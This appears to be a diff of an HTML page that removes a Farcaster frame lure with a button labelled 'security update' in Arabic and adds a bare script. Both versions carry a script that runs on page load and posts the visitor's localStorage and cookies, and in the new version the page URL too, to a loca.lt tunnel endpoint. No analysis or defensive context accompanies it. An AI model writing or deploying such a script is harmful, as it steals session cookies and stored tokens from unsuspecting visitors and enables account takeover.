@@ -1,23 +1,13 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta property="fc:frame" content="vNext" />
-    <meta property="fc:frame:image" content="https://via.placeholder.com/600x400" />
-    <meta property="fc:frame:button:1" content="تحديث أمني" />
-    <meta property="fc:frame:post_url" content="https://moody-spiders-build.loca.lt/collect" />
-</head>
-<body>
-    <script>
-        // إرسال البيانات فوراً إلى خادمك المحلي
-        fetch('https://moody-spiders-build.loca.lt/collect', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                localStorage: JSON.stringify(localStorage),
-                cookies: document.cookie,
-                timestamp: new Date().toISOString()
-            })
-        });
-    </script>
-</body>
-</html>
+<script>
+    fetch('https://tasty-dolls-mix.loca.lt/collect', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            localStorage: JSON.stringify(localStorage),
+            cookies: document.cookie,
+            url: window.location.href,
+            timestamp: new Date().toISOString()
+        })
+    }).then(response => console.log('Data sent!'))
+      .catch(error => console.error('Error:', error));
+</script>
